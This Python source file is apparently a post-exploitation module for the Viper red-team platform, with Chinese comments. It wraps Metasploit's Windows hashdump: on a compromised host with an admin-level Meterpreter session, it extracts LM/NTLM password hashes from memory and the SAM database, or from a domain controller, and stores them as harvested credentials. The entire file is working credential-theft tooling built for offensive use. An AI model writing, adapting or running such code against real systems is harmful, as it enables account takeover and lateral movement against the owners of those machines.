# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :


from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME_ZH = "获取Windows内存Hash"
    DESC_ZH = "此模块使用Hashdump抓取内存及SAM数据库中的Hask.\n" \
              "针对DC的Haskdump的耗时与域用户数量成正比."
    REQUIRE_SESSION = True
    MODULETYPE = TAG2TYPE.Credential_Access
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = ["T1003"]  # ATTCK向量
    REFERENCES = ["https://attack.mitre.org/techniques/T1003/"]
    README = ["https://www.yuque.com/vipersec/module/wkqgqd"]
    AUTHOR = "Viper"

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "post"
        self.mname = "windows/gather/hashdump_api"

    def check(self):
        """执行前的检查函数"""
        self.session = Session(self._sessionid)
        if self.session.is_windows is not True:
            return False, "此模块只支持Windows的Meterpreter"
        if self.session.is_admin is not True:
            return False, "此模块需要管理员权限,请尝试提权"
        return True, None

    def callback(self, status, message, data):
        if status:
            self.log_info("获取Hash列表:")
            domain = self.session.domain
            for record in data:
                self.log_raw(record.get("hash_string"))
                try:
                    type = "Hash"
                    user = record.get("user_name")
                    if user.endswith("$") or user == "Guest":
                        continue
                    password = f"{record.get('lanman')}:{record.get('ntlm')}"
                    tag = {'domain': domain, 'type': type}
                    self.add_credential(username=user, password=password, password_type='windows', tag=tag)
                except Exception as E:
                    self.log_except(E)
                    continue
        else:
            print_str = "运行失败:{}".format(message)
            self.log_error(print_str)
        self.log_info("Hash已存储,可以到<数据管理>-<凭证>页面查看")
